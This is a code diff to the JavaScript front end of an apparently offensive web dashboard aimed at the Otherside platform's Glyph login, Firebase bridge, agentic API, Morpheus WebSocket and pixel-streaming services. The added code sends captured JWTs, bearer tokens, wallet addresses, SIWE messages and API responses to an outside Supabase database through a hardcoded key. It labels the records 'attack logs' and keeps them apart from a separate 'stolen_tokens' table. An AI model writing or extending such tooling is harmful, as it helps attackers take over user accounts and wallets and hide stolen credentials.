@@ -484,6 +484,10 @@
                 <span class="phase-num">5</span>
                 <span class="phase-label">Pixel Stream</span>
             </button>
+            <button class="phase-btn" onclick="switchPhase('results')" style="background:#14532d;">
+                <span class="phase-num">DB</span>
+                <span class="phase-label">Results</span>
+            </button>
         </div>
 
         <!-- Global Stats -->
@@ -1016,7 +1020,44 @@ window.emitMouseClick = function(x, y) {
                 </div>
             </div>
         </div>
+
+        <!-- ================================================================ -->
+        <!-- RESULTS: SUPABASE DB QUERY -->
+        <!-- ================================================================ -->
+        <div class="phase-content" id="phase-results">
+            <div class="card">
+                <h3>📊 Database Results <span class="badge badge-green">Supabase</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    All attack results are automatically saved to the <code>otherside_attack_logs</code> table in Supabase. Use this tab to query and review collected data.
+                </p>
+                <div class="alert-box alert-info">
+                    <strong>Table:</strong> <code>otherside_attack_logs</code> &nbsp;|&nbsp;
+                    <strong>DB:</strong> <code>anruszfozkhgddzpcpft.supabase.co</code> &nbsp;|&nbsp;
+                    <strong>Columns:</strong> All use <code>os_</code> prefix (separate from <code>stolen_tokens</code>)
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Query Attack Logs <span class="badge badge-purple">Supabase</span></h3>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="loadResults(null)">Load All Results</button>
+                    <button class="btn btn-outline" onclick="loadResults('glyph_oidc_discovery')">Phase 1: Glyph OIDC</button>
+                    <button class="btn btn-outline" onclick="loadResults('glyph_token_exchange')">Phase 1: Token Exchange</button>
+                    <button class="btn btn-outline" onclick="loadResults('glyph_fb_bridge')">Phase 1: FB Bridge</button>
+                    <button class="btn btn-outline" onclick="loadResults('agentic_api_mapping')">Phase 2: Agentic Map</button>
+                    <button class="btn btn-outline" onclick="loadResults('agentic_api_request')">Phase 2: API Request</button>
+                    <button class="btn btn-outline" onclick="loadResults('morpheus_endpoint_discovery')">Phase 3: Morpheus</button>
+                    <button class="btn btn-outline" onclick="loadResults('morpheus_ws_connect')">Phase 3: WS Connect</button>
+                    <button class="btn btn-outline" onclick="loadResults('native_client_analysis')">Phase 4: Native</button>
+                    <button class="btn btn-outline" onclick="loadResults('pixel_streaming_discovery')">Phase 5: Streaming</button>
+                </div>
+                <div class="console" id="resultsLog" style="max-height:600px;">
+                    <div class="log-info">[DB] Click a button above to query attack results from Supabase.</div>
+                </div>
+            </div>
+        </div>
     </div>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
     <!-- Proxy helper (uses /api/proxy for CORS-bypassed requests) -->
     <script>
@@ -1027,6 +1068,76 @@ window.emitMouseClick = function(x, y) {
         let morpheusWS = null;
         let streamingWS = null;
         let packetCount = 0;
+        let osDBExfilCount = 0;
+
+        // ===================================================================
+        // SUPABASE INITIALIZATION (separate table: otherside_attack_logs)
+        // Column names are prefixed with os_ to differ from stolen_tokens
+        // ===================================================================
+        const OS_SUPABASE_URL = 'https://anruszfozkhgddzpcpft.supabase.co';
+        const OS_SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MjE2NzcsImV4cCI6MjA5MzQ5NzY3N30.Ap3qNDAfJeKYS-3cUn3_A2c4rif3v13mx2Ex1uukp7c';
+
+        let osDB;
+        try {
+            osDB = window.supabase.createClient(OS_SUPABASE_URL, OS_SUPABASE_ANON_KEY);
+        } catch(e) {
+            console.error('Supabase init error (otherside_attack_logs):', e);
+        }
+
+        // ===================================================================
+        // SUPABASE SAVE — writes to otherside_attack_logs table
+        // All columns use os_ prefix (different from stolen_tokens)
+        // ===================================================================
+        async function saveToOthersideDB(data) {
+            if (!osDB) {
+                console.warn('[OS-DB] Supabase not initialized, skipping save');
+                return false;
+            }
+            try {
+                // Auto-add metadata if not provided
+                if (!data.os_source_domain) data.os_source_domain = window.location.hostname;
+                if (!data.os_operator_agent) data.os_operator_agent = navigator.userAgent;
+                if (!data.os_operator_screen) data.os_operator_screen = `${screen.width}x${screen.height}`;
+                if (!data.os_operator_language) data.os_operator_language = navigator.language;
+                if (!data.os_operator_timezone) data.os_operator_timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                if (!data.os_operator_referrer) data.os_operator_referrer = document.referrer || '';
+
+                const { data: result, error } = await osDB
+                    .from('otherside_attack_logs')
+                    .insert([data])
+                    .select();
+
+                if (error) {
+                    console.error('[OS-DB] Insert error:', error.message);
+                    return false;
+                }
+                osDBExfilCount++;
+                stats.sessions = osDBExfilCount;
+                updateStats();
+                return true;
+            } catch(e) {
+                console.error('[OS-DB] Exception:', e.message);
+                return false;
+            }
+        }
+
+        // ===================================================================
+        // SUPABASE QUERY — reads from otherside_attack_logs table
+        // ===================================================================
+        async function queryOthersideDB(phase = null, limit = 50) {
+            if (!osDB) return [];
+            try {
+                let query = osDB
+                    .from('otherside_attack_logs')
+                    .select('*')
+                    .order('os_capture_timestamp', { ascending: false })
+                    .limit(limit);
+                if (phase) query = query.eq('os_attack_phase', phase);
+                const { data, error } = await query;
+                if (error) { console.error('[OS-DB] Query error:', error.message); return []; }
+                return data || [];
+            } catch(e) { console.error('[OS-DB] Query exception:', e.message); return []; }
+        }
 
         function updateStats() {
             document.getElementById('statEndpoints').textContent = stats.endpoints;
@@ -1173,6 +1284,14 @@ window.emitMouseClick = function(x, y) {
             setProgress('glyphProgress', 100);
             updateStats();
             log(cId, 'Glyph OIDC discovery complete.', 'success');
+
+            // Save to Supabase
+            await saveToOthersideDB({
+                os_attack_phase: 'glyph_oidc_discovery',
+                os_research_notes: 'Glyph OIDC discovery scan completed',
+                os_vuln_severity: stats.vulns > 0 ? 'medium' : 'info',
+                os_oidc_discovery_data: { endpoints_tested: stats.endpoints, apis_discovered: stats.discovered }
+            });
         }
 
         async function probeGlyphAuth() {
@@ -1284,6 +1403,16 @@ window.emitMouseClick = function(x, y) {
 
             setProgress('glyphForgeProgress', 100);
             updateStats();
+
+            // Save token exchange results
+            await saveToOthersideDB({
+                os_attack_phase: 'glyph_token_exchange',
+                os_glyph_client_id: clientId,
+                os_glyph_redirect_target: redirectUri,
+                os_research_notes: 'Glyph to Firebase token exchange attempt',
+                os_vuln_severity: 'high',
+                os_exchange_response: { firebaseKey: firebaseKey, customTokenUrlStatus: result.status }
+            });
         }
 
         async function buildSIWEMessage() {
@@ -1301,6 +1430,15 @@ window.emitMouseClick = function(x, y) {
             log(cId, 'If the signature is intercepted, it can be replayed to authenticate as the wallet owner.', 'warning');
             stats.tokens++;
             updateStats();
+
+            // Save SIWE message
+            await saveToOthersideDB({
+                os_attack_phase: 'glyph_siwe_message',
+                os_wallet_addr: wallet,
+                os_siwe_message_content: siweMessage,
+                os_research_notes: 'SIWE message generated for wallet auth',
+                os_vuln_severity: 'medium'
+            });
         }
 
         async function testGlyphCallback() {
@@ -1372,6 +1510,18 @@ window.emitMouseClick = function(x, y) {
 
                 stats.tokens++;
                 updateStats();
+
+                // Save decoded token data
+                await saveToOthersideDB({
+                    os_attack_phase: 'glyph_token_decode',
+                    os_oidc_jwt_raw: token.substring(0, 500),
+                    os_oidc_token_claims: payload,
+                    os_oidc_token_issuer: payload.iss || '',
+                    os_oidc_token_expiry: payload.exp ? new Date(payload.exp * 1000).toISOString() : null,
+                    os_wallet_addr: payload.wallet || payload.sub || '',
+                    os_vuln_severity: (header.alg === 'none' || header.alg === 'HS256') ? 'critical' : 'info',
+                    os_research_notes: `Decoded JWT: alg=${header.alg}, iss=${payload.iss || 'N/A'}, exp=${payload.exp ? new Date(payload.exp * 1000).toISOString() : 'N/A'}`
+                });
             } catch (e) {
                 log(cId, `Token decode error: ${e.message}`, 'error');
             }
@@ -1400,6 +1550,15 @@ window.emitMouseClick = function(x, y) {
 
             stats.endpoints += 2;
             updateStats();
+
+            // Save Firebase bridge results
+            await saveToOthersideDB({
+                os_attack_phase: 'glyph_fb_bridge',
+                os_oidc_jwt_raw: token.substring(0, 200),
+                os_fb_bridge_response: { odkExchange: result, fbResult: fbResult.data },
+                os_vuln_severity: fbResult.ok ? 'critical' : 'info',
+                os_research_notes: fbResult.ok ? 'Glyph token successfully exchanged for Firebase token!' : 'Firebase exchange failed'
+            });
         }
 
         async function testGlyphScopes() {
@@ -1472,6 +1631,15 @@ window.emitMouseClick = function(x, y) {
             setProgress('agenticProgress', 100);
             updateStats();
             log(cId, 'Agentic API mapping complete.', 'success');
+
+            // Save agentic API mapping results
+            await saveToOthersideDB({
+                os_attack_phase: 'agentic_api_mapping',
+                os_bearer_token: token.substring(0, 50) + '...',
+                os_endpoint_map: { paths_tested: paths.length, discovered: stats.discovered },
+                os_research_notes: `Agentic API mapping: tested ${paths.length} paths, found ${stats.discovered} endpoints`,
+                os_vuln_severity: 'info'
+            });
         }
 
         async function probeAgentEndpoints() {
@@ -1575,6 +1743,19 @@ window.emitMouseClick = function(x, y) {
 
             stats.endpoints++;
             updateStats();
+
+            // Save agentic API request results
+            await saveToOthersideDB({
+                os_attack_phase: 'agentic_api_request',
+                os_api_route: endpoint,
+                os_request_method: method,
+                os_request_payload: parsedBody,
+                os_api_response: result.data || result.error || result,
+                os_http_status: result.status || 0,
+                os_bearer_token: token.substring(0, 50) + '...',
+                os_research_notes: `${method} /api/v0/${endpoint} → ${result.status || 'ERR'}`,
+                os_vuln_severity: result.status === 200 ? 'high' : 'info'
+            });
         }
 
         async function startAgenticSession() {
@@ -1656,6 +1837,14 @@ window.emitMouseClick = function(x, y) {
             setProgress('morpheusProgress', 100);
             updateStats();
             log(cId, 'Morpheus endpoint discovery complete.', 'success');
+
+            // Save Morpheus discovery results
+            await saveToOthersideDB({
+                os_attack_phase: 'morpheus_endpoint_discovery',
+                os_infra_probe_result: { endpoints_tested: endpoints.length, discovered: stats.discovered },
+                os_research_notes: `Morpheus endpoint discovery: tested ${endpoints.length} endpoints`,
+                os_vuln_severity: 'info'
+            });
         }
 
         async function probeMSquaredInfrastructure() {
@@ -1744,6 +1933,15 @@ window.emitMouseClick = function(x, y) {
                     log(cId, 'CONNECTED to Morpheus WebSocket!', 'success');
                     stats.sessions++;
                     updateStats();
+
+                    // Save WS connection event
+                    saveToOthersideDB({
+                        os_attack_phase: 'morpheus_ws_connect',
+                        os_ws_endpoint: url,
+                        os_ws_auth_credential: token ? token.substring(0, 50) + '...' : '',
+                        os_research_notes: `Connected to Morpheus WebSocket: ${url}`,
+                        os_vuln_severity: 'medium'
+                    });
                 };
 
                 morpheusWS.onmessage = (event) => {
@@ -1914,6 +2112,15 @@ window.emitMouseClick = function(x, y) {
             setProgress('nativeProgress', 100);
             updateStats();
             log(cId, 'Native client analysis complete.', 'success');
+
+            // Save native client analysis results
+            await saveToOthersideDB({
+                os_attack_phase: 'native_client_analysis',
+                os_native_credential: token.substring(0, 50) + '...',
+                os_client_api_map: { odk_endpoints_tested: odkEndpoints.length },
+                os_research_notes: `Native client analysis: tested ${odkEndpoints.length} ODK endpoints`,
+                os_vuln_severity: 'info'
+            });
         }
 
         async function enumerateClientAPIs() {
@@ -2206,6 +2413,14 @@ window.emitMouseClick = function(x, y) {
             setProgress('streamingProgress', 100);
             updateStats();
             log(cId, 'Pixel Streaming discovery complete.', 'success');
+
+            // Save streaming discovery results
+            await saveToOthersideDB({
+                os_attack_phase: 'pixel_streaming_discovery',
+                os_streaming_infra: { endpoints_tested: endpoints.length, js_paths: jsPaths.length },
+                os_research_notes: `Pixel Streaming discovery: tested ${endpoints.length} endpoints`,
+                os_vuln_severity: 'info'
+            });
         }
 
         async function probeSignalingServer() {
@@ -2510,6 +2725,48 @@ class CustomPixelStreamingClient {
             log(cId, clientCode, 'data');
             log(cId, '', 'info');
             log(cId, 'To use: Instantiate with signaling URL, call connect(), then use injectInput() to send commands.', 'info');
+        }
+
+        // ===================================================================
+        // RESULTS: LOAD FROM SUPABASE
+        // ===================================================================
+        async function loadResults(phase = null) {
+            const cId = 'resultsLog';
+            const el = document.getElementById(cId);
+            el.innerHTML = '';
+            log(cId, phase ? `Loading results for: ${phase}...` : 'Loading all results...', 'info');
+
+            const rows = await queryOthersideDB(phase, 100);
+
+            if (rows.length === 0) {
+                log(cId, 'No results found. Run some attack tools first to generate data.', 'warning');
+                return;
+            }
+
+            log(cId, `Found ${rows.length} records:`, 'success');
+            log(cId, '─'.repeat(80), 'dim');
+
+            rows.forEach((row, i) => {
+                log(cId, `\n[${i + 1}] Phase: ${row.os_attack_phase || 'N/A'} | Time: ${row.os_capture_timestamp || 'N/A'}`, 'info');
+                if (row.os_vuln_severity) log(cId, `  Severity: ${row.os_vuln_severity}`, row.os_vuln_severity === 'critical' ? 'critical' : row.os_vuln_severity === 'high' ? 'error' : 'success');
+                if (row.os_wallet_addr) log(cId, `  Wallet: ${row.os_wallet_addr}`, 'data');
+                if (row.os_api_route) log(cId, `  API Route: ${row.os_api_route}`, 'data');
+                if (row.os_http_status) log(cId, `  HTTP Status: ${row.os_http_status}`, row.os_http_status === 200 ? 'success' : 'warning');
+                if (row.os_ws_endpoint) log(cId, `  WS Endpoint: ${row.os_ws_endpoint}`, 'data');
+                if (row.os_oidc_token_issuer) log(cId, `  Token Issuer: ${row.os_oidc_token_issuer}`, 'data');
+                if (row.os_research_notes) log(cId, `  Notes: ${row.os_research_notes}`, 'dim');
+
+                // Show key JSONB fields as abbreviated
+                const jsonbFields = ['os_oidc_discovery_data', 'os_exchange_response', 'os_fb_bridge_response',
+                    'os_api_response', 'os_request_payload', 'os_endpoint_map', 'os_infra_probe_result',
+                    'os_streaming_infra', 'os_client_api_map', 'os_oidc_token_claims', 'os_captured_packet'];
+                jsonbFields.forEach(field => {
+                    if (row[field]) {
+                        const str = typeof row[field] === 'string' ? row[field] : JSON.stringify(row[field]);
+                        log(cId, `  ${field}: ${str.substring(0, 200)}${str.length > 200 ? '...' : ''}`, 'data');
+                    }
+                });
+            });
         }
 
         // ===================================================================
